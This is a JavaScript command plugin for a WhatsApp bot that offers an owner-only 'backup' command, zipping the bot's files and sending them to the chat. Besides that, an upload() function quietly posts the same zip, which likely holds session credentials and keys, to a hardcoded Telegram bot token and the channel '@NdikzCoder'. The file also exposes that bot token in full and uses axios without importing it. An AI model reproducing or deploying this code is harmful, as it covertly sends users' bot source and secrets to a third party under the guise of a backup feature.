const fs = require('fs');
const FormData = require('form-data');
const archiver = require('archiver');
const path = require('path');
const { execSync } = require('child_process');
let handler = async (m, { conn }) => {
  conn.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  const ls = execSync("ls")
            .toString()
            .split("\n")
            .filter(pe => 
                pe != "node_modules" && 
                pe != "package-lock.json" && 
                pe != "backup.zip" &&
                pe != ""
            );
        console.log("Files to be zipped:", ls);
        const zipFileName = "backup.zip";
        const zipFilePath = path.resolve(zipFileName);
        execSync(`zip -r ${zipFilePath} ${ls.join(" ")}`);
  let sesi = await fs.readFileSync('./backup.zip')
  await conn.sendMessage(m.chat, { document: sesi, mimetype: 'zip', fileName: 'backup.zip' }, { quoted: m })
await upload('./backup.zip', 'Ini Sc backup')
  conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
    m.reply('sucsess')
}

handler.help = ['backup']
handler.tags = ['owner']
handler.command = /^backup$/i

handler.owner = true

module.exports = handler

async function upload(dir, text) {
const token = "7527510891:AAHZmbHqSwTjIJQNMd8wvUJct1F3u1g2NUU";
        const chatId = '@NdikzCoder'; // Gantilah dengan ID channel Anda
        const filePath = dir;

        const url = `https://api.telegram.org/bot${token}/sendDocument`;

        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('document', fs.createReadStream(filePath));
        form.append('caption', text);

        try {
            const response = await axios.post(url, form, {
                headers: {
                    ...form.getHeaders(),
                },
                maxBodyLength: Infinity,
                maxContentLength: Infinity
            });
            console.log(response.data);
        } catch (error) {
            console.error(error);
        }
    }